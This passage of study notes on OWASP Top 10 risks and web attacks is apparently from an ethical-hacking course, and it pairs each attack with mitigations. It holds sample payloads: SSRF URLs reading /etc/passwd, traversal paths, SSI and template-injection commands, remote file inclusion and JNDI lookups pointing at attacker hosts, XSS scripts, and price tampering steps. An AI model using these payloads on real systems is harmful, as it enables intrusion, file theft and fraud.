						- Replay the session by entering a manipulated URL: http://certifiedhackershop.com/sale/saleitems=304;jsessionid=12OMTOIDPXM0OQSABGCKLHCJUN2JV?dest=NewMexico  
						- This allows the attacker to access the victim’s account without needing login credentials.
					- Mitigation:
						- Never expose session IDs in URLs (use cookies or secure headers instead).
						- Implement session fixation protections by regenerating session IDs after login.
						- Use secure and HTTP-only cookies with appropriate expiration settings.
				- Password Exploitation:
					- Many web applications rely on user IDs and passwords for authentication. However, weak password storage and poor hashing mechanisms make password databases easy targets for attackers.
					- Common Password Exploitation Risks:
						- Weak or outdated hashing algorithms (e.g., MD5, SHA-1).
						- Storing passwords in plaintext instead of securely hashing and salting them.
						- Lack of multi-factor authentication (MFA), making brute-force attacks easier.
					- Mitigation:
						- Use strong hashing algorithms (e.g., bcrypt, Argon2, PBKDF2).
						- Enforce password complexity policies to prevent weak passwords.
						- Implement MFA to add an extra layer of security.
				- Timeout Exploitation (Session Hijacking):
					- If session timeouts are too long and session IDs remain unchanged after login, attackers can hijack an active session and gain the same privileges as the victim.
					- Example:
						- A user logs into www.certifiedhacker.com but forgets to log out.
						- The web application keeps the session active for 2 hours.
						- An attacker gains physical access to the user’s device, opens the browser, and clicks on the saved session in the history.
						- Since the session is still valid, the attacker gains full access to the victim’s account without needing credentials.
					- Mitigation:
						- Set short session timeouts and invalidate idle sessions promptly.
						- Regenerate session IDs after authentication.
						- Implement automatic logout mechanisms when users close the browser.
			- Common Attacks in This Category:
				- Cross-Site Request Forgery (CSRF) – Attackers trick users into executing unauthorized actions on authenticated sessions.
				- Cookie/Session Poisoning – Attackers manipulate cookies or session data to alter permissions or hijack accounts.
				- Cookie Snooping – Attackers intercept session cookies through packet sniffing or unsecured connections.
			- Best Practices for Secure Authentication & Session Management:
				- Enforce strong password policies (minimum length, complexity, and expiration).
				- Use MFA (multi-factor authentication) to add an extra layer of security.
				- Never store session IDs in URLs—use secure cookies with HTTPOnly and Secure flags.
				- Regenerate session IDs after login to prevent session fixation.
				- Set short session timeouts and invalidate sessions on logout or inactivity.
				- Use strong encryption to store authentication credentials.
				- Monitor authentication logs to detect and respond to suspicious login attempts.
			- By implementing robust authentication and session management mechanisms, organizations can prevent account takeovers, session hijacking, and credential theft, ensuring stronger protection for user accounts.
		- A08 – Software and Data Integrity Failures:
			- Many applications implement auto-update features to keep software up to date. However, if these updates are downloaded from unauthorized or previously trusted sources without proper integrity checks, attackers can exploit this flaw to distribute malware or malicious code. Additionally, if data serialization formats are easily readable or modifiable, attackers can manipulate the data, leading to insecure deserialization vulnerabilities.
			- Software and data integrity failures occur when organizations:
				- Fail to update software with the latest security patches.
				- Use unverified third-party libraries, plugins, or dependencies from public repositories, content delivery networks (CDNs), or untrusted sources.
				- Implement automatic software updates without proper verification.
			- Common Risks:
				- Insecure CI/CD pipelines: Attackers inject malicious code into continuous integration and deployment (CI/CD) workflows, leading to compromised software releases.
				- Unverified third-party dependencies: Downloading untrusted components can introduce vulnerabilities.
				- Insecure serialization: Weakly encoded data can be manipulated, leading to remote code execution or data tampering.
			- To mitigate these risks, developers should:
				- Audit source code and third-party dependencies.
				- Secure CI/CD pipelines with code signing and integrity checks.
				- Use trusted repositories for software libraries and plugins.
				- Implement encryption or digital signatures for serialized data.
			- Common Security Weaknesses in This Category:
				- Inclusion of functionalities from untrusted sources – Using unverified external code increases the risk of malicious injections.
				- Downloading code without integrity checks – Auto-updates from unauthorized sources can introduce backdoors.
				- Deserialization of untrusted data – Attackers modify serialized objects to execute arbitrary commands or manipulate application logic.
			- Common Attacks in This Category:
				- Insecure Deserialization – Attackers modify serialized data to execute unauthorized actions.
				- Unvalidated Redirects and Forwards – Users are redirected to malicious sites.
				- Watering Hole Attack – Attackers compromise trusted websites to distribute malware.
				- Denial-of-Service (DoS) Attacks – Attackers overload the system, making it unavailable.
				- Buffer Overflow – Exploits memory corruption vulnerabilities.
				- Web Service Attacks – Target APIs and web services.
				- Platform Exploits – Attackers leverage vulnerabilities in application platforms.
				- Magecart Attack – Malicious JavaScript injects code to steal payment data.
			- Potential Exploits Due to Software and Data Integrity Failures:
				- Cache Poisoning – Attackers manipulate cached data to deliver malicious content.
				- Code Injection – Malicious scripts are inserted into applications.
				- Command Execution – Attackers execute unauthorized commands.
				- Denial of Service (DoS) – System resources are exhausted, causing downtime.
				- Data Theft – Sensitive data is stolen due to weak integrity protections.
			- Example Attack Scenario - Compromised CI/CD Pipeline:
				- Attackers exploit an insecure CI/CD pipeline of an organization.
				- They inject malicious code into the software build process.
				- The organization unknowingly distributes compromised software to users.
				- Clients download and install the malicious software without integrity verification.
				- Attackers gain remote access to the client’s network, allowing data theft, espionage, or full system compromise.
			- Mitigation Strategies:
				- Enforce strict software supply chain security (use signed software packages).
				- Use code integrity verification techniques (e.g., hashing, checksums, cryptographic signatures).
				- Secure CI/CD pipelines (limit access, use secure repositories, scan for vulnerabilities).
				- Regularly update and patch software (ensure dependencies are safe).
				- Monitor for unauthorized modifications (log and analyze update processes).
			- By following best security practices, organizations can protect against software and data integrity failures, preventing malware distribution, data breaches, and system takeovers.
		- A09 – Security Logging and Monitoring Failures:
			- Security logging and monitoring failures occur due to insufficient log monitoring, improper log storage, weak error messages, and inadequate alert mechanisms for failed login attempts. When applications fail to identify threats in advance, attackers can exploit these vulnerabilities to compromise systems, tamper with credentials, or destroy data.
			- Understanding Security Logging and Monitoring
				- Web applications maintain logs to track user activities, including login attempts, administrative actions, and security events. However, many applications suffer from weaknesses such as:
					- Insufficient logging – Failing to record critical security events.
					- Improper output neutralization for logs – Allowing attackers to inject malicious content.
					- Exclusion of security-relevant information – Logs missing essential attack details.
					- Logging of sensitive data – Exposing user credentials or personal information in logs.
				- When logging and monitoring mechanisms are inadequate, attackers can:
					- Tamper with or delete log records to erase traces of malicious activity.
					- Modify logs to mislead forensic investigations.
					- Perform brute-force attacks without triggering alerts.
					- Exploit weak error messages that expose system details.
			- Common Causes of Security Logging and Monitoring Failures:
				- Lack of essential log data – Logs do not capture successful/failed login attempts, security events, or high-risk transactions.
				- Vague or insufficient error messages – Generic errors fail to provide meaningful security insights.
				- Inadequate monitoring of application and API logs – Delayed or missing alerts increase response time to threats.
				- Local log storage – Logs stored locally can be tampered with or deleted by attackers.
				- Lack of incident response escalation – Organizations fail to escalate or act upon detected threats.
				- Failure of security tools – Dynamic Application Security Testing (DAST) tools like OWASP ZAP may fail to detect certain anomalies.
				- Absence of real-time monitoring and alerting – Applications cannot detect and escalate suspicious activities in real-time.
			- Common Attacks in This Category:
				- Web Service Attacks – Exploiting insufficient logging in APIs to perform unauthorized access.
				- Log Injection Attacks – Injecting fake logs to manipulate monitoring systems.
				- Brute Force Attacks – Repeated login attempts without triggering alerts.
				- Privilege Escalation – Exploiting missing audit logs to perform unauthorized actions undetected.
			- Example Attack Scenario - Exploiting Weak Log Monitoring:
				- A web application fails to log failed login attempts.
				- An attacker brute-forces user credentials without triggering alerts.
				- Due to insufficient monitoring, the attack remains undetected for an extended period.
				- The attacker successfully gains unauthorized access to an account and performs malicious actions.
			- Mitigation Strategies:
				- Enable comprehensive logging – Capture successful/failed login attempts, security events, and transactions.
				- Use centralized log storage – Prevent attackers from tampering with local logs.
				- Implement real-time monitoring and alerts – Detect suspicious activities immediately.
				- Secure logs – Encrypt logs and restrict access to authorized users only.
				- Regularly review and analyze logs – Use SIEM (Security Information and Event Management) tools to detect anomalies.
				- Establish an incident response plan – Ensure quick response to detected threats.
			- By implementing robust logging and monitoring mechanisms, organizations can detect, investigate, and respond to security threats before they escalate.
		- A10 – Server-Side Request Forgery (SSRF):
			- Server-Side Request Forgery (SSRF) is a web security vulnerability that occurs when an application fetches remote resources without properly validating user-supplied URLs. Attackers exploit this flaw to manipulate server requests, gaining unauthorized access to internal resources or sending malicious requests to protected systems behind firewalls, VPNs, or access control lists (ACLs).
			- Understanding SSRF Attacks:
				- Attackers leverage SSRF vulnerabilities in public-facing web servers to send crafted requests to internal or backend systems. Since these backend servers trust requests from internal networks, they unknowingly expose sensitive data or services.
				- A common SSRF scenario occurs when an application fetches external data via user-provided URLs. For example:
					- A web application loads content from: https://xyz.com/feed.php?url=externalsite.com/feed/
					- If the application fails to validate the URL, an attacker can manipulate it to: https://xyz.com/feed.php?url=http://localhost/admin or https://xyz.com/feed.php?url=file:///etc/passwd
				- This allows attackers to:
					- Access internal files (e.g., reading /etc/passwd)
					- Scan internal network services
					- Bypass authentication mechanisms
					- Perform remote code execution
			- Types of SSRF Attacks:
				- Injecting an SSRF Payload: Attackers inject SSRF payloads into parameters that accept URLs or file paths. These payloads modify headers, allowing access to unauthorized internal resources.
				- Accessing Internal Resources: Attackers exploit SSRF to bypass firewall restrictions and access admin panels or restricted server files.
					- Example URLs for accessing internal pages:
						- https://www.certifiedhacker.com/page?url=http://127.0.0.1/admin
						- https://www.certifiedhacker.com/page?url=http://127.0.0.1/pgadmin
						- https://www.certifiedhacker.com/page?url=http://127.0.0.1/phpmyadmin
					- Example URLs for accessing internal files:
						- https://www.certifiedhacker.com/page?url=file:///etc/passwd
						- https://www.certifiedhacker.com/page?url=file://path/to/file
				- Using a URL Scheme to Access Internal Services: Attackers can exploit protocol-specific URL schemes to target internal services such as FTP, LDAP, and DNS.
					- Examples for FTP exploitation:
						- https://www.certifiedhacker.com/page?url=ftp://attacker.net:11211/
						- https://www.certifiedhacker.com/page?url=sftp://attacker.net:11111/
					- Examples for LDAP exploitation:
						- https://www.certifiedhacker.com/page?url=ldap://127.0.0.1/%0astats%0aquit
						- https://www.certifiedhacker.com/page?url=ldap://localhost:11211/%0astats%0aquit
				- Cross-Site Port Attack (XSPA): Attackers use SSRF to scan open ports on internal servers by abusing loopback interfaces (127.0.0.1, localhost).
					- Example URLs for scanning open ports:
						- https://www.certifiedhacker.com/page?url=http://localhost:22/ (SSH)
						- https://www.certifiedhacker.com/page?url=http://127.0.0.1:25/ (SMTP)
						- https://www.certifiedhacker.com/page?url=http://127.0.0.1:3389/ (RDP)
			- Common Attacks Related to SSRF:
				- Injecting an SSRF Payload – Modifying server requests to access internal resources.
				- Cross-Site Port Attack (XSPA) – Scanning for open ports on internal servers.
				- DNS Rebinding Attack – Bypassing same-origin policy to hijack internal services.
				- H2C Smuggling Attack – Exploiting HTTP/2 to HTTP/1.1 conversion vulnerabilities.
			- Mitigation Strategies:
				- Whitelist trusted URLs – Allow only predefined, safe domains.
				- Block direct access to internal IPs – Prevent requests to 127.0.0.1, 192.168.x.x, 10.x.x.x.
				- Use URL validation – Restrict allowed protocols (e.g., block file://, ftp://).
				- Enforce strong network segmentation – Separate public and internal resources.
				- Log and monitor server requests – Detect anomalous request patterns.
			- By implementing strict URL validation, access controls, and monitoring, organizations can effectively prevent SSRF attacks.
	- Web Application Attacks:
		- Directory Traversal:
			- When access is provided outside a defined application, there is a risk of unintended information disclosure or modification. Complex applications are configured with multiple directories that serve as application components and data storage. An application can traverse these directories to locate and execute legitimate portions of its functionality.
			- A directory traversal (or forceful browsing) attack occurs when an attacker is able to browse directories and files outside the normal application access. Such an attack exposes the directory structure of an application, as well as the underlying web server and operating system. Directory traversal allows attackers to access restricted directories—including application source code, configuration files, and critical system files—and execute commands outside the web server's root directory.
			- Attackers can manipulate variables that reference files using "dot-dot-slash (../)" sequences and variations.
			- With this level of access to a web application's architecture, an attacker can:
				- Enumerate the contents of files and directories.
				- Access pages that otherwise require authentication (and possibly payment).
				- Gain insight into the application's structure and construction.
				- Discover user IDs and passwords stored in hidden files.
				- Locate source code and other sensitive files left on the server.
				- View confidential data, such as customer information.
			- Examples of Directory Traversal Attacks:
				- Example 1: Retrieving a Web Application Backup:
					- An attacker uses ../ to navigate back several directories and obtain a backup file of a web application:
					- http://www.targetsite.com/../../../sitebackup.zip
				- Example 2: Accessing the /etc/passwd File on a UNIX/Linux System
					- This example attempts to obtain the /etc/passwd file, which contains user account information:
					- http://www.targetsite.com/../../../../etc/passwd
				- Example 3: Accessing Files Outside the Web Publishing Directory
					- An attacker tries to access files located outside the web publishing directory using directory traversal:
					- http://www.certifiedhacker.com/process.aspx?page=../../../../some_dir/some_file
					- http://www.certifiedhacker.com/../../../../some_dir/some_file
		- Hidden Field Manipulation:
			- Attackers often exploit hidden field manipulation attacks against e-commerce websites, as many of these sites use hidden fields to store price and discount information. Developers commonly store client-side data—such as product prices and discount rates—in hidden fields, assuming this data is secure. However, attackers can manipulate these hidden values, altering product prices and completing transactions at fraudulent rates.
			- When a user selects items on an HTML page, the selection is stored as form field values and sent to the server as an HTTP request (via GET or POST). HTML also allows values to be stored in hidden fields, which are not displayed in the browser but are still submitted as form parameters. Attackers can inspect the HTML code, modify these hidden field values, and send altered requests to the server to manipulate transactions.
			- Example of Hidden Field Manipulation:
				- A mobile phone listed at $1000 on an e-commerce website could be purchased for just $10 if an attacker modifies the hidden price field before submitting the order. Such attacks can lead to severe financial losses for website owners, despite their use of advanced security measures such as firewalls, intrusion detection systems (IDS), and antivirus software. Beyond financial damage, businesses may also suffer reputational harm.
				- Code Example - Below is an example of an HTML form containing a hidden price field:
					<form method="post" action="page.aspx">
						<input type="hidden" name="PRICE" value="200.00">
						Product name: <input type="text" name="product" value="Certifiedhacker Shirt"><br>
						Product price: 200.00 <br>
						<input type="submit" value="Submit">
					</form>
				- Steps to Exploit Hidden Field Manipulation:
					- Open the HTML page in an editor.
					- Locate the hidden field (e.g., <input type="hidden" name="PRICE" value="200.00">).
					- Modify the value to a lower price (e.g., <input type="hidden" name="PRICE" value="2.00">).
					- Save the modified HTML file locally and open it in a browser.
					- Click the Buy button to submit the altered price, effectively committing electronic shoplifting.
		- Same-Site Attack:
			- A same-site attack, also known as a related-domain attack, occurs when an attacker targets a subdomain of a trusted organization and redirects users to a malicious web page under their control. Attackers often exploit misconfigured or abandoned subdomains to execute this attack.
			- Common top-level domains (TLDs) such as .edu, .com, and .org often have multiple subdomains, some of which may be left unused or improperly configured. Attackers take advantage of these vulnerabilities to hijack legitimate websites and create dangling records using extended TLDs (eTLDs). Websites that share the same eTLD+1 domain are classified as same sites, making them potential targets for same-site attacks.
			- How Same-Site Attacks Work:
				- These attacks exploit the idea that external threats are easier to identify than insider threats. Victims are redirected to an attacker-controlled page that mimics a secure, legitimate website. Attackers can compromise vulnerable subdomains through various methods, including:
					- Phishing attacks
					- Malware injection
					- Cookie poisoning
					- Abuse of JavaScript APIs
				- Users who rely on dynamic DNS services are particularly vulnerable to these attacks. Additionally, because subdomains under the same eTLD+1 domain often share cookies, attackers can steal authentication cookies, leading to unauthorized access.
			- Same-Site Attack Scenario:
				- In a same-site attack, an attacker could redirect a user attempting to visit: www.certifiedhacker.com
				- To a dangling subdomain they control, such as: rans.certifiedhacker.com
				- Since both sites share the same base domain (certifiedhacker.com), users may mistakenly believe the malicious site is legitimate. Once redirected, the attacker can:
					- Bypass security policies
					- Steal credentials (credential sniffing)
					- Conduct phishing attacks
					- Inject malware
		- Pass-the-Cookie Attack:
			- A pass-the-cookie attack allows attackers to access a user’s web services without providing credentials or performing multi-factor authentication (MFA). This attack occurs when an attacker obtains a clone of a valid session cookie from the user’s browser and uses it to establish a session with the target web server. If attackers can retrieve the appropriate cookies, they may log in as a legitimate user, bypassing all authentication checkpoints.
			- Attackers can obtain these cookies through various methods, including malware, phishing attacks, or specialized tools designed to extract stored browser data.
			- For example, Mozilla Firefox stores cookies in a local SQLite database, which attackers can access using tools such as firefox_creds. If the captured cookie is a session cookie, an attacker can inject it into their own browser, effectively hijacking an active session. Additionally, attackers can use tools like Mimikatz to extract encrypted cookies and decrypt them for unauthorized access.
		- SQL Injection:
			- A SQL injection (SQLi) attack involves injecting malicious SQL queries into an application’s database query mechanism to manipulate or exploit the database. Many applications use SQL statements for authentication, role validation, data storage, retrieval, and linking to other data sources. SQL injection attacks succeed when an application fails to properly validate user input before passing it into an SQL query.
			- Example of SQL Injection Attack:
				- Consider the following SQL statement used to retrieve a user’s record: SELECT * FROM tablename WHERE UserID = 2302
				- An attacker can manipulate this query by injecting an additional condition: SELECT * FROM tablename WHERE UserID = 2302 OR 1=1
				- Since "1=1" always evaluates to TRUE, the query may return all records from the table, allowing the attacker to enumerate user IDs and extract sensitive data.
			- Methods of SQL Injection:
				- Attackers can execute SQL injection attacks through:
				- Address bars (e.g., manipulating query parameters in URLs)
				- Form fields (e.g., login forms, search boxes)
				- Queries and searches (e.g., filtering and sorting mechanisms in web applications)
			- Potential Consequences of SQL Injection Attacks
				- SQL injection attacks can allow an attacker to:
				- Log into an application without valid credentials
				- Execute unauthorized queries and access sensitive data
				- Modify or delete database records
				- Drop entire databases, leading to data loss
				- Exploit trust relationships between application components to gain access to other databases
		- Command Injection:
			- Command injection vulnerabilities allow attackers to execute arbitrary commands on a target system by exploiting web applications. These attacks typically involve passing malicious input to:
				- Operating system commands via system calls
				- External programs via shell commands
				- Backend databases via SQL queries
			- Poorly designed web applications—especially those using interpreters such as Perl, Python, PHP, and Bash—are particularly susceptible to command injection attacks. If an application fails to properly validate user input, attackers can insert malicious commands that the system executes blindly.
			- Web applications often interact with operating system features and external programs to perform various functions. A common example is the sendmail program. If an application does not properly sanitize external HTTP request parameters, an attacker can inject special characters, malicious commands, or command modifiers, leading to unauthorized system execution. SQL injection is a well-known subset of command injection. These attacks are relatively easy to execute and detect, but understanding their full impact can be complex.
			- Types of Command Injection Attacks:
				- Shell Injection:
					- Attackers craft input strings to gain shell access to a web server.
					- Common functions vulnerable to shell injection include: system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start()
				- HTML Embedding:
					- Used for website defacement by injecting additional HTML-based content.
					- Attackers exploit vulnerabilities where user input is embedded into web pages without proper sanitization.
				- File Injection:
					- Attackers inject malicious code into system files through improperly validated user input.
					- Example: http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil.com/exploit?
			- Command Injection Example:
				- An attacker exploits a vulnerable input field by injecting malicious code to change an account password: www.certifiedhacker.com/banner.gif||newpassword||1036|60|468
					- The last two numbers specify the banner size.
					- The attacker clicks Submit, causing the server to execute the injected command.
					- The password for account 1036 is changed to "newpassword".
					- The application incorrectly assumes the input field contains only a banner image URL, allowing the attack to succeed.
				- File Injection Attacks:
					- A file injection attack occurs when a vulnerable web application allows users to dynamically specify files for inclusion without proper validation. Attackers exploit this to include remote malicious files instead of trusted local files.
					- How File Injection Works:
						- The attacker supplies an external file instead of a legitimate local file.
						- The application blindly processes the request and executes the external script.
						- The attacker gains control over the application, leading to data theft, remote code execution, or further exploitation.
					- Web applications using PHP are particularly vulnerable because of the extensive use of file includes in PHP scripts. If an application allows dynamic file inclusion without sanitization, attackers can execute arbitrary PHP scripts on the server.
					- Vulnerable PHP Example:
						<?php  
						$drink = 'coke';  
						if (isset($_GET['DRINK'])) {  
							$drink = $_GET['DRINK'];  
						}  
						require($drink . '.php');  
						?>
					- Exploiting the Vulnerability:
						- An attacker injects a remotely hosted exploit file: http://www.certifiedhacker.com/orders.php?DRINK=http://jasoneval.com/exploit?
						- Since the application directly includes the provided URL as a PHP script, it executes the remote exploit, allowing the attacker to run arbitrary commands.
				- Prevention and Mitigation:
					- To prevent command and file injection attacks:
					- Sanitize user input – Disallow special characters and restrict input to expected values.
					- Use parameterized queries – Prevent attackers from injecting arbitrary commands.
					- Limit system access – Restrict execution privileges for web applications.
					- Disable remote file inclusion – Configure PHP and other languages to reject remote file executions.
					- Implement web application firewalls (WAFs) – Detect and block suspicious requests.
		- LDAP Injection:
			- Lightweight Directory Access Protocol (LDAP) is used to store and organize information hierarchically in a directory tree based on attributes. It operates on a client-server model, allowing clients to query directory entries using filters. LDAP commonly runs over TCP/IP and serves as an open-standard protocol for querying and managing directory services.
			- LDAP injection attacks function similarly to SQL injection attacks but target LDAP queries instead of SQL statements. Attackers exploit improperly validated user input to manipulate LDAP search filters, gaining unauthorized access to directory services or databases linked to the LDAP tree.
			- How LDAP Injection Works:
				- Web applications often construct LDAP queries dynamically based on user input.
				- If input validation is weak, an attacker can inject malicious LDAP filters to alter the query logic.
				- This allows attackers to bypass authentication, escalate privileges, or extract sensitive directory information.
				- Attackers typically analyze search filter attributes to understand the underlying LDAP query structure. Once identified, they modify user-supplied input to determine whether the application is vulnerable and manipulate its responses accordingly.
			- Consequences of LDAP Injection:
				- Depending on the implementation, LDAP injection attacks can lead to:
				- Login Bypass – Authenticate without valid credentials.
				- Information Disclosure – Extract sensitive directory information.
				- Privilege Escalation – Gain higher access levels.
				- Data Modification – Alter stored directory information.
			- Example of LDAP Injection:
				- To test for LDAP injection vulnerabilities, an attacker sends an invalid query to observe how the server handles errors. If the LDAP server returns a detailed error message, the application may be vulnerable.
				- Consider an authentication system using LDAP queries: (&(USER=certifiedhacker)(PASS=blah))
				- If an attacker enters the username "certifiedhacker)(&)", the query transforms into: (&(USER=certifiedhacker)(&))(PASS=blah))
				- The LDAP server only processes the first valid filter: (&(USER=certifiedhacker)(&))
				- The (&) condition always evaluates to TRUE, allowing the attacker to log in without a valid password.
			- Defending Against LDAP Injection:
				- To mitigate LDAP injection risks, organizations should:
				- Sanitize User Input – Restrict special characters like *, (), and &.
				- Use Parameterized Queries – Avoid direct user input in LDAP queries.
				- Implement Least Privilege Access – Limit directory access permissions.
				- Disable Detailed Error Messages – Prevent attackers from learning LDAP query structures.
				- Monitor and Log LDAP Queries – Detect suspicious activity early.
			- By enforcing strict input validation and secure query handling, organizations can prevent LDAP injection attacks and secure their directory services.
		- Other Injection Attacks:
			- Several other types of injection attacks exist, each exploiting different vulnerabilities in web applications and servers.
			- Server-Side JavaScript (JS) Injection:
				- Server-side JavaScript injection vulnerabilities occur when an application inserts user-controlled values into a string that is later evaluated dynamically by the server’s JavaScript interpreter. Attackers exploit improper validation of user input to modify the executed code, compromising application functionality and data. Additionally, attackers can use a compromised server as a launchpad for further attacks within the target network.
				- Example of Server-Side JavaScript Injection:
					- Attackers can cause a Denial of Service (DoS) attack by passing commands to the eval() function: while (1);
					- This command forces the server’s event loop to use all processor resources, preventing it from handling further inputs until the process is restarted.
					- Attackers can also read files from the server:
						- res.end(require('fs').readdirSync('.').toString());
						- res.end(require('fs').readdirSync('..').toString());
					- Once file names are obtained, they can read file contents: res.end(require('fs').readFileSync('filename'));
				- Furthermore, attackers can execute malicious binaries using the fs and child_process modules, leading to remote code execution (RCE).
			- Server-Side Includes (SSI) Injection:
				- Server-Side Includes (SSI) is a feature that allows developers to dynamically generate web page content using directives such as file includes, CGI variables, and shell commands. Once evaluated, the directives are replaced with the corresponding content before the final HTML is sent to users.
				- Example of SSI Injection:
					- Consider an application using the following directives:
						<!--#include virtual="/footer.html" -->
						<!--#echo var="DATE_LOCAL" -->
					- If the application does not sanitize user input, attackers can inject malicious SSI directives: <!--#exec cmd="cat /etc/passwd" -->
					- This command allows the attacker to retrieve sensitive system files, modify or delete server files, and execute arbitrary shell commands.
			- Server-Side Template Injection (SSTI):
				- Web applications often use template engines to separate business logic from data presentation. SSTI occurs when unsanitized user input is embedded into templates, allowing attackers to inject malicious template directives that can execute arbitrary code.
				- Example of Server-Side Template Injection:
					- Consider the following vulnerable PHP template:
						<html>
						<head><title>{{title}}</title></head>
						<body>
							<form method="{{method}}" action="{{action}}">
								<input type="text" name="user" value="{{username}}">
								<input type="password" name="pwd" value="">
								<button type="submit">Submit</button>
							</form>
							<p>This page took {{microtime(true) - time}} seconds to render.</p>
						</body>
						</html>
					- An attacker could inject a payload such as: {{ system('cat /etc/passwd') }}
					- If the application processes this template, the attack results in remote code execution.
			- Log Injection:
				- Log injection occurs when unvalidated user input is written to application logs, allowing attackers to insert misleading or malicious log entries. This technique can be used to cover attack traces or manipulate system monitoring.
				- Example of Log Injection:
					- A typical log format: Date, Time, Username, ID, Source IP, Request
					- An attacker manipulates the id parameter to inject malicious log entries: id=\r\n (Fake input)
					- If the log system does not properly sanitize input, an attacker may also inject null bytes (%00) to truncate logs or hide activity.
			- HTML Injection:
				- HTML injection occurs when an attacker injects HTML code into a web page through unsanitized input fields. Unlike JavaScript injection (XSS), HTML injection focuses on modifying page content rather than executing scripts.
				- Example of HTML Injection:
					- Consider an application displaying search results:
						<h1>Results matching your query:</h1>
						<h2>{user_query}</h2>
						<ol>
							<li>Result A</li>
							<li>Result B</li>
						</ol>
					- An attacker submits: </h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
					- This modifies the page: <h2></h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
					- If users click the malicious link, they may be redirected to a phishing site or malware download.
			- Carriage Return Line Feed (CRLF) Injection:
				- CRLF injection occurs when attackers insert carriage return (\r) and line feed (\n) characters into application input. This can be exploited for log manipulation, HTTP response splitting, and HTTP request smuggling.
				- Example of CRLF Injection:
					- A normal log entry: 10.10.10.10 - 09:25 - /index.php?page=about
					- An attacker submits: /index.php?page=about&%0d%0a127.0.0.1 - 09:25 - /index.php?page=admin
					- This results in a forged log entry, making it appear that the administrator accessed a page they never actually visited.
			- Java Naming and Directory Interface (JNDI) Injection:
				- JNDI is a Java API used for looking up objects in directory services such as LDAP, DNS, and RMI. JNDI injection occurs when an attacker tricks the application into resolving a remote, malicious object, leading to remote code execution (RCE).
				- Example of JNDI Injection:
					- A vulnerable Java method:
						@RequestMapping("/lookup")
						public Object lookup(@RequestParam String name) throws Exception {
							return new javax.naming.InitialContext().lookup(name);
						}
					- An attacker provides: ldap://attacker.com/maliciousObject
					- If the application fetches and executes the object, the attacker gains full control over the server.
				- Another example:
					Registry registry = LocateRegistry.createRegistry(1097);
					Reference ref = new javax.naming.Reference("ExploitClass", "ExploitClass", "http://attacker.com/");
					ReferenceWrapper refWrap = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
					registry.bind("Object", refWrap);
				- Here, the malicious Java class is hosted remotely and executed by the vulnerable application.
			- Mitigation Strategies:
				- To protect against these injection attacks, organizations should:
				- Validate and Sanitize Input – Reject or properly escape special characters.
				- Use Parameterized Queries – Avoid direct user input in queries.
				- Disable Dynamic Code Execution – Prevent eval(), exec(), or similar functions.
				- Implement Content Security Policies (CSP) – Restrict unsafe content.
				- Limit Error Disclosure – Hide error messages that expose application logic.
				- Regular Security Audits – Continuously test for vulnerabilities.
		- Cross-Site Scripting (XXS):
			- Cross-site scripting (XSS or CSS) attacks exploit vulnerabilities in dynamically generated web pages, allowing malicious attackers to inject client-side scripts into web pages viewed by other users. These attacks occur when unvalidated input data is included in dynamic content sent to a user's web browser for rendering.
			- Attackers inject malicious JavaScript, VBScript, ActiveX, HTML, or Flash into legitimate requests to execute harmful actions on a victim's system. By bypassing client-side security mechanisms, attackers gain unauthorized privileges and inject malicious scripts into web pages. These scripts can even rewrite the HTML content of a website.
			- Potential Exploits of XSS Attacks:
				- XSS attacks can lead to:
				- Malicious script execution
				- Redirecting users to malicious servers
				- Exploiting user privileges
				- Hidden ads in iframes and pop-ups
				- Data manipulation
				- Session hijacking
				- Brute-force password cracking
				- Data theft
				- Intranet probing
				- Keylogging and remote monitoring
			- How XSS Attacks Work:
				- A web page consists of text and HTML markup created by the server and rendered by the client browser. While servers control how static pages are interpreted, they cannot fully control the client's interpretation of dynamically generated content.
				- If an attacker inserts untrusted content into a dynamic page, neither the server nor the client recognizes it as malicious. Untrusted input can come from various sources, including URL parameters, form elements, cookies, and database queries.
				- When the dynamic data inserted by the web server contains special characters, the user's web browser may mistakenly interpret them as HTML markup. Since browsers treat some characters as special (to distinguish between text and markup), an attacker can insert harmful scripts into the generated page, tricking the browser into executing them.
				- Because these malicious scripts execute within the browser’s security context, they can communicate with the legitimate web server, granting the attacker complete access to the document and the ability to send stolen data back to their site.
			- Cross-Site Scripting Attack Scenarios:
				-  Attack via Email:
					- In an email-based XSS attack, the attacker crafts an email containing a malicious link and sends it to the victim, tricking them into clicking it.
					- For example, if the attacker finds an XSS vulnerability on bank.com, they can construct a link embedding a malicious script: <A HREF="http://bank.com/registration.cgi?clientprofile=<SCRIPT>maliciouscode</SCRIPT>">Click here</A>
					- When the victim clicks the link, the request (containing malicious code) is sent to bank.com, which then unknowingly includes the injected script in the response page. The victim’s browser executes the script, prompting them to enter sensitive details. Once submitted, the attacker captures this information and can impersonate the victim to gain access to their online bank account and perform fraudulent activities.
				- XSS Attack in Blog Posting:
					- The attacker discovers an XSS vulnerability on techpost.org and injects the following malicious script into a blog comment: <script>onload=window.location='http://www.certifiedhacker.com'</script>
					- Since the comment is stored on the web application’s database server, the script remains active. When users visit TechPost, the script executes and redirects them to the malicious website (certifiedhacker.com).
				- XSS Attack in Comment Fields:
					- Many web applications dynamically accept user-generated data. Attackers exploit this by injecting malicious scripts into comment sections.
					- For example, an attacker injects the following script into the comment field of techpost.org: <script>alert("Hello World")</script>
					- Since the comment is stored on the web application’s database, the script runs when any user visits the page, displaying a pop-up alert with the message "Hello World." If the user clicks OK, the attacker may gain access to their browser session and execute further malicious actions.
			- Techniques to Evade XSS Filters:
				- Web browsers implement XSS filters to protect users from these attacks. However, attackers can bypass these filters by injecting unusual characters into the HTML code.
				- Modern browsers have strong security measures, making direct script injection harder. To counter this, attackers exploit application design flaws and bypass input validation processes conducted by servers and browsers. XSS filter bypassing methods typically leverage flaws in server-side or browser-side security implementations, targeting specific browser versions or web applications.
				- Most browsers sanitize HTML, JavaScript, and CSS before rendering pages. However, XSS filter evasion leverages the complexity of browser behavior, allowing scripts to slip through without detection.
				- Common XSS Filter Evasion Techniques:
					- Using Event Handlers:
						- Some HTML tags permit script injection even when <script> tags are blocked. Attackers exploit event handlers to run scripts when a user interacts with an element.
						- Example of event handler injection: <img src="#" onerror="alert('XSS Attack!')">
						- Commonly abused event handlers include: onfocus, onerror, onclick
					- Encoding Characters:
						- Attackers encode characters in different formats to evade filters that detect suspicious text.
